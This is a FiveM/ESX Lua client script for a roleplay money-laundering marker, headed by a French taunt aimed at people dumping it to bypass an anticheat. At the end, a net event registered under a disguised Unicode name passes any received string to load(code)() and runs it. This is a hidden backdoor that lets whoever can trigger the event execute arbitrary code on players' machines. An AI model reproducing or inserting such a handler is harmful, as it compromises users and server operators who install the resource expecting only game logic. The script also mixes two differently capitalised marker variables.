-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local HasAlreadyEnteredMarker = false
local CurrentAction = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local isInMarker = false

		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId(), false), Config.Pos, true) < 2.0 then
			isInMarker = true
		end

		if isInMarker and not hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = true
			CurrentAction = 'MoneyWash'
		end

		if not isInMarker and hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = false
			_TriggerServerEvent('::{korioz#0110}::esx_moneywash:stopWash')
			CurrentAction = nil
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			ESX.ShowHelpNotification('Blanchiment d\'argent')

			if IsControlJustReleased(0, 38) then
				_TriggerServerEvent('::{korioz#0110}::esx_moneywash:startWash')
				CurrentAction = nil
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)